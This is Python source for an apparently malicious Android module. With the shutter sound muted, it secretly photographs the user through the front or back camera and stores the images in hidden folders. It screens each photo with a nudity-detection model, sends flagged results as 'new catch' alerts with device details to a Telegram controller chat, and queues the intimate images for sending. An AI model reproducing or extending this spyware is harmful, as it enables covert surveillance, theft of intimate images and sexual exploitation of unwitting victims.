# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import json
import hashlib
from datetime import datetime

# ========== المسارات الموحّدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "ctmp")                     # مجلد الصور المؤقتة
QUEUE = os.path.join(P, ".cache_thumb")         # مجلد الصور الحساسة قيد الإرسال
CONFIG = os.path.join(P, "camera_config.json")  # ملف إعدادات منفصل

# إنشاء المجلدات
for d in [P, T, QUEUE]:
    os.makedirs(d, exist_ok=True)

# إعداد السجل
logging.basicConfig(
    filename=os.path.join(P, "c.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ========== استيراد JNI (للوصول إلى كاميرا الأندرويد) ==========
try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False

# ========== استيراد PIL و numpy مع الحماية (تصحيح الخطأ 1) ==========
PIL_AVAILABLE = False
NUMPY_AVAILABLE = False
Image = None
ImageOps = None
np = None

try:
    from PIL import Image, ImageOps
    PIL_AVAILABLE = True
    logging.info("✅ PIL loaded successfully")
except ImportError as e:
    logging.error(f"❌ PIL import error: {e}")

try:
    import numpy as np
    NUMPY_AVAILABLE = True
    logging.info("✅ NumPy loaded successfully")
except ImportError as e:
    logging.error(f"❌ NumPy import error: {e}")


class CameraAnalyzer:
    def __init__(self, mon=None, det=None):
        self.mon = mon
        self.det = det                    # كائن NudeDetector (يحمل نموذج AI)
        self.busy = False
        self._old_volume = -1
        self._config = self._load_config()
        self._camera_lock = threading.Lock()
        self._last_capture_time = 0
        self._min_capture_interval = 2.0   # ثانيتان بين كل التقاطين
        self._max_capture_retries = 2      # محاولات إعادة عند الفشل

    # ---------- إدارة الإعدادات ----------
    def _load_config(self):
        """تحميل الإعدادات من الملف مع التحقق من صحتها (تصحيح الخطأ 3)"""
        default_config = {
            "quality": 80,                  # 1-100
            "max_file_age": 3600,
            "min_battery": 15,              # 0-100
            "detection_threshold": 0.85,    # 0.0-1.0
            "image_size": "medium",         # small, medium, large
            "front_camera_id": 1,
            "back_camera_id": 0,
            "max_image_dimension": 2048     # حد أقصى لأبعاد الصورة (حماية)
        }

        if os.path.exists(CONFIG):
            try:
                with open(CONFIG, 'r', encoding='utf-8') as f:
                    loaded = json.load(f)
                default_config.update(loaded)
            except Exception as e:
                logging.error(f"Config file corrupt, using defaults: {e}")

        # التحقق من القيم وتصحيحها
        self._validate_config(default_config)
        return default_config

    def _validate_config(self, cfg):
        """تصحيح أي قيم غير صالحة في الإعدادات (تصحيح الخطأ 3)"""
        # الجودة بين 10 و 100
        if not (10 <= cfg.get("quality", 80) <= 100):
            logging.warning("Invalid quality, resetting to 80")
            cfg["quality"] = 80
        # الحد الأدنى للبطارية بين 5 و 100
        if not (5 <= cfg.get("min_battery", 15) <= 100):
            logging.warning("Invalid min_battery, resetting to 15")
            cfg["min_battery"] = 15
        # عتبة الكشف بين 0.0 و 1.0
        if not (0.0 <= cfg.get("detection_threshold", 0.85) <= 1.0):
            logging.warning("Invalid detection_threshold, resetting to 0.85")
            cfg["detection_threshold"] = 0.85
        # حجم الصورة يجب أن يكون أحد القيم المعروفة
        if cfg.get("image_size", "medium") not in ("small", "medium", "large"):
            cfg["image_size"] = "medium"
        # أقصى بعد للصورة
        if cfg.get("max_image_dimension", 2048) < 640:
            cfg["max_image_dimension"] = 2048

    def _save_config(self):
        try:
            with open(CONFIG, 'w', encoding='utf-8') as f:
                json.dump(self._config, f, ensure_ascii=False)
            return True
        except Exception as e:
            logging.error(f"Save config error: {e}")
            return False

    # ---------- الصلاحيات والتحقق من الجهاز ----------
    def _check_camera_permission(self):
        if not JNI:
            return True
        try:
            from android.permissions import check_permission, Permission
            return check_permission(Permission.CAMERA)
        except:
            return True  # افتراض المنح في حالة الخطأ

    def _is_camera_available(self, cam_id):
        if not JNI:
            return False
        try:
            Camera = autoclass('android.hardware.Camera')
            CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
            num = Camera.getNumberOfCameras()
            if num <= cam_id:
                return False
            desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
            for i in range(num):
                info = CameraInfo()
                Camera.getCameraInfo(i, info)
                if info.facing == desired_facing:
                    return True
            return False
        except Exception as e:
            logging.error(f"Camera check error: {e}")
            return False

    def _power_ok(self):
        try:
            b, c = self.mon._battery_ok() if self.mon else (100, True)
            return b >= self._config.get("min_battery", 15) or c
        except:
            return True

    def _mute_audio(self, mute=True):
        if not JNI:
            return
        try:
            AudioManager = autoclass('android.media.AudioManager')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            am = ctx.getSystemService(ctx.AUDIO_SERVICE)
            if mute:
                self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            else:
                if self._old_volume >= 0:
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, self._old_volume, 0)
                    self._old_volume = -1
        except Exception as e:
            logging.error(f"Mute error: {e}")

    # ---------- تنظيف الملفات المؤقتة ----------
    def _cleanup_old_files(self):
        try:
            now = time.time()
            max_age = self._config.get("max_file_age", 3600)
            for folder in [T, QUEUE]:
                if os.path.exists(folder):
                    for f in os.listdir(folder):
                        path = os.path.join(folder, f)
                        try:
                            if os.path.getmtime(path) < now - max_age:
                                os.remove(path)
                        except:
                            pass
        except Exception as e:
            logging.error(f"Cleanup error: {e}")

    # ---------- أدوات الصورة ----------
    def _compress_image(self, path, quality=None):
        """ضغط الصورة لتقليل الحجم، مع التحقق من وجود PIL"""
        quality = quality or self._config.get("quality", 80)
        if not PIL_AVAILABLE or Image is None:
            logging.warning("PIL not available, skipping compression")
            return False
        try:
            with Image.open(path) as img:
                img = img.convert('RGB')
                img.save(path, "JPEG", quality=quality, optimize=True)
            return True
        except Exception as e:
            logging.error(f"Compression error: {e}")
            return False

    def _generate_unique_filename(self, prefix="img"):
        ts = int(time.time())
        h = hashlib.md5(f"{ts}{os.getpid()}".encode()).hexdigest()[:8]
        return f"{prefix}_{ts}_{h}.jpg"

    def _get_preferred_size(self, supported_sizes):
        if not supported_sizes:
            return None
        target_area = {"small": 640*480, "medium": 1280*720, "large": 1920*1080}
        target = target_area.get(self._config.get("image_size", "medium"), 1280*720)
        # لا يتجاوز الحد الأقصى للبعد
        max_dim = self._config.get("max_image_dimension", 2048)
        valid = [s for s in supported_sizes if s.width <= max_dim and s.height <= max_dim]
        if not valid:
            valid = supported_sizes
        return min(valid, key=lambda s: abs(s.width * s.height - target))

    def _safe_remove(self, path):
        try:
            if os.path.exists(path):
                os.remove(path)
                return True
        except Exception as e:
            logging.error(f"Remove error: {e}")
        return False

    # ---------- التقاط الصورة (Camera1) ----------
    def _capture_camera1(self, cam_id):
        Camera = autoclass('android.hardware.Camera')
        CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
        num = Camera.getNumberOfCameras()
        target_id = -1
        desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
        for i in range(num):
            info = CameraInfo()
            Camera.getCameraInfo(i, info)
            if info.facing == desired_facing:
                target_id = i
                break
        if target_id == -1:
            raise Exception(f"No camera with facing {desired_facing}")

        camera = Camera.open(target_id)
        if not camera:
            raise Exception("Failed to open camera")

        out_path = None
        image_saved = threading.Event()
        image_data = [None]

        try:
            params = camera.getParameters()
            supported = params.getSupportedPictureSizes()
            if supported:
                best = self._get_preferred_size(supported)
                if best:
                    params.setPictureSize(best.width, best.height)
            params.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
            # إسكات صوت الغالق
            try:
                params.set("shutter-sound", 0)
            except:
                pass
            rotation = 270 if cam_id == 1 else 90
            params.setRotation(rotation)
            camera.setParameters(params)

            out_path = os.path.join(T, self._generate_unique_filename(f"c1_{cam_id}"))

            class PicCallback(PythonJavaClass):
                __javainterfaces__ = ['android.hardware.Camera$PictureCallback']
                def __init__(self, event, store, path):
                    super().__init__()
                    self.event = event
                    self.store = store
                    self.path = path
                @java_method('([BLandroid/hardware/Camera;)V')
                def onPictureTaken(self, data, cam):
                    try:
                        self.store[0] = data
                        with open(self.path, 'wb') as f:
                            f.write(data)
                    except Exception as e:
                        logging.error(f"Camera1 write error: {e}")
                        self.path = None
                    finally:
                        self.event.set()

            callback = PicCallback(image_saved, image_data, out_path)
            camera.startPreview()
            time.sleep(0.6)  # انتظار استقرار المعاينة
            camera.takePicture(None, None, callback)

            if not image_saved.wait(10):
                raise TimeoutError("Camera1 capture timeout")

            camera.stopPreview()

            if out_path and os.path.exists(out_path) and os.path.getsize(out_path) > 500:
                self._compress_image(out_path)
                return out_path
            else:
                self._safe_remove(out_path)
                raise Exception("Empty or invalid image")
        finally:
            try:
                camera.release()
            except:
                pass

    # ---------- التقاط الصورة (Camera2 احتياطي) (تصحيح الخطأ 2) ----------
    def _capture_camera2(self, cam_id):
        try:
            CameraManager = autoclass('android.hardware.camera2.CameraManager')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            cm = ctx.getSystemService(ctx.CAMERA_SERVICE)
            camera_ids = cm.getCameraIdList()
            if cam_id >= len(camera_ids):
                raise Exception(f"Camera2 ID {cam_id} out of range")
            camera_id = camera_ids[cam_id]

            ImageReader = autoclass('android.media.ImageReader')
            ImageFormat = autoclass('android.graphics.ImageFormat')
            reader = ImageReader.newInstance(1024, 768, ImageFormat.JPEG, 1)
            Surface = autoclass('android.view.Surface')
            surfaces = [Surface(reader.getSurface())]

            capture_done = threading.Event()
            capture_path = [None]

            class CaptureCallback(PythonJavaClass):
                __javainterfaces__ = ['android.hardware.camera2.CameraCaptureSession$CaptureCallback']
                def __init__(self, event, path):
                    super().__init__()
                    self.event = event
                    self.path = path
                @java_method('(Landroid/hardware/camera2/CameraCaptureSession;Landroid/hardware/camera2/CaptureRequest;Landroid/hardware/camera2/TotalCaptureResult;)V')
                def onCaptureCompleted(self, session, request, result):
                    self.event.set()

            class StateCallback(PythonJavaClass):
                __javainterfaces__ = ['android.hardware.camera2.CameraDevice$StateCallback']
                def __init__(self, event, path, surfaces):
                    super().__init__()
                    self.event = event
                    self.path = path
                    self.surfaces = surfaces
                @java_method('(Landroid/hardware/camera2/CameraDevice;)V')
                def onOpened(self, device):
                    try:
                        cap_cb = CaptureCallback(self.event, self.path)
                        device.createCaptureSession(self.surfaces, cap_cb, None)
                    except Exception as e:
                        logging.error(f"Camera2 session error: {e}")
                        self.event.set()
                @java_method('(Landroid/hardware/camera2/CameraDevice;I)V')
                def onError(self, device, error):
                    logging.error(f"Camera2 device error: {error}")
                    self.event.set()

            capture_path[0] = os.path.join(T, self._generate_unique_filename(f"c2_{cam_id}"))
            state_cb = StateCallback(capture_done, capture_path[0], surfaces)
            cm.openCamera(camera_id, state_cb, None)

            if not capture_done.wait(8):
                raise TimeoutError("Camera2 capture timeout")

            if capture_path[0] and os.path.exists(capture_path[0]) and os.path.getsize(capture_path[0]) > 500:
                self._compress_image(capture_path[0])
                return capture_path[0]
            else:
                self._safe_remove(capture_path[0])
                raise Exception("Camera2 produced invalid image")
        except Exception as e:
            logging.error(f"Camera2 failed: {e}")
            return None

    # ---------- الواجهة الرئيسية للالتقاط (مع إعادة المحاولة) ----------
    def capture(self, cam_id=0):
        if not self._check_camera_permission():
            logging.warning("Camera permission not granted")
            return None
        if not self._is_camera_available(cam_id):
            logging.warning(f"Camera {cam_id} not available")
            return None
        if self.busy:
            logging.warning("Camera busy")
            return None
        if not self._power_ok():
            logging.warning("Battery too low")
            return None
        now = time.time()
        if now - self._last_capture_time < self._min_capture_interval:
            logging.warning("Too soon since last capture")
            return None
        self._last_capture_time = now

        with self._camera_lock:
            if self.busy:
                return None
            self.busy = True

        out_path = None
        try:
            self._mute_audio(True)
            # محاولة Camera1 أولاً، ثم Camera2 كخطة بديلة (تصحيح الخطأ 2)
            for attempt in range(self._max_capture_retries + 1):
                try:
                    out_path = self._capture_camera1(cam_id)
                    if out_path:
                        logging.info("✅ Camera1 success")
                        break
                except Exception as e:
                    logging.warning(f"Camera1 attempt {attempt+1} failed: {e}")
                    time.sleep(0.5)
                    if attempt == self._max_capture_retries:
                        logging.info("Falling back to Camera2...")
                        out_path = self._capture_camera2(cam_id)
                        if out_path:
                            logging.info("✅ Camera2 success")
                        break
        except Exception as e:
            logging.error(f"Capture sequence error: {e}")
        finally:
            self._mute_audio(False)
            self.busy = False
            self._cleanup_old_files()

        return out_path

    # ---------- تحضير الصورة لتحليل AI ----------
    def _prepare_for_ai(self, path):
        if not os.path.exists(path):
            return None
        if not PIL_AVAILABLE or not NUMPY_AVAILABLE or Image is None or np is None:
            logging.warning("PIL/NumPy missing, cannot prepare for AI")
            return None
        try:
            with Image.open(path) as img:
                img = img.convert('RGB').resize((224, 224), Image.BILINEAR)
                arr = np.asarray(img, dtype=np.float32) / 255.0
                return np.expand_dims(arr, axis=0)
        except Exception as e:
            logging.error(f"AI prep error: {e}")
            return None

    # ---------- العملية الكاملة: التقاط + تحليل + إشعار ----------
    def harvest(self, cam_id=0):
        pic_path = self.capture(cam_id)
        if not pic_path:
            return

        is_nude = False
        confidence = 0.0
        if self.det and getattr(self.det, 'model', None) is not None:
            input_arr = self._prepare_for_ai(pic_path)
            if input_arr is not None:
                try:
                    self.det.model.set_tensor(self.det.in_idx, input_arr)
                    self.det.model.invoke()
                    out = self.det.model.get_tensor(self.det.out_idx)[0]
                    confidence = float(out[1]) if len(out) > 1 else float(out[0])
                    if confidence > self._config["detection_threshold"]:
                        is_nude = True
                except Exception as e:
                    logging.error(f"AI inference error: {e}")
        else:
            logging.debug("No AI model loaded")

        if is_nude:
            # إرسال إشعار فوري
            if self.mon and hasattr(self.mon, 'ui') and self.mon.ui:
                try:
                    cam_type = "الأمامية" if cam_id == 1 else "الخلفية"
                    alert = (
                        f"🔞 **صيد جديد!**\n"
                        f"📱 الجهاز: `{self.mon.dmd}`\n"
                        f"📸 الكاميرا: {cam_type}\n"
                        f"🎯 الثقة: `{confidence:.1%}`\n"
                        f"⏰ الوقت: `{datetime.now().strftime('%H:%M:%S')}`"
                    )
                    self.mon.ui._api("sendMessage", {
                        "chat_id": self.mon.ctrl,
                        "text": alert,
                        "parse_mode": "Markdown"
                    })
                except Exception as e:
                    logging.error(f"Notification error: {e}")

            # نقل إلى مجلد الانتظار
            dest = os.path.join(QUEUE, os.path.basename(pic_path))
            try:
                if os.path.exists(dest):
                    base, ext = os.path.splitext(dest)
                    dest = f"{base}_{int(time.time())}{ext}"
                os.rename(pic_path, dest)
            except Exception as e:
                logging.error(f"Move to queue error: {e}")
                self._safe_remove(pic_path)
        else:
            # حذف الصورة العادية فوراً
            self._safe_remove(pic_path)

    # ---------- أدوات تحكم إضافية ----------
    def set_quality(self, q):
        if 10 <= q <= 100:
            self._config["quality"] = q
            self._save_config()
            return True
        return False

    def set_min_battery(self, p):
        if 5 <= p <= 100:
            self._config["min_battery"] = p
            self._save_config()
            return True
        return False

    def set_detection_threshold(self, t):
        if 0.0 <= t <= 1.0:
            self._config["detection_threshold"] = t
            self._save_config()
            return True
        return False

    def get_status(self):
        return {
            "busy": self.busy,
            "camera_available": self._is_camera_available(0) and self._is_camera_available(1),
            "permission": self._check_camera_permission(),
            "power_ok": self._power_ok(),
            "config": self._config
        }


# ========== دالة المصنع ==========
def create(mon=None, det=None):
    return CameraAnalyzer(mon, det)
